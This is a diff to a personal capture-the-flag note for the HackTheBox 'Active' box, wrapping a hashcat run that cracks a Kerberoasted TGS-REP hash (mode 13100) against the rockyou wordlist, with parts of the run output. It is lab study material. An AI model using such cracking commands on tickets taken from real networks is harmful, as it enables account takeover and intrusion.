@@ -1,4 +1,12 @@
+# HTB - Active — hashcat
 
+#HTB #Active #hashcat #Kerberoasting #Cracking
+
+Cracking the TGS-REP hash with mode **13100** (Kerberos 5 etype 23) against rockyou — recovered in ~6s. Box note: [[CTF Notes/HTB/Boxes/Active/notes|notes]].
+
+---
+
+```
 hashcat -m 13100 adminticket.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
@@ -75,3 +83,4 @@ Hardware.Mon.#1..: Util: 55%
 
 Started: Fri Aug  8 09:45:03 2025
 Stopped: Fri Aug  8 09:45:23 2025
+```
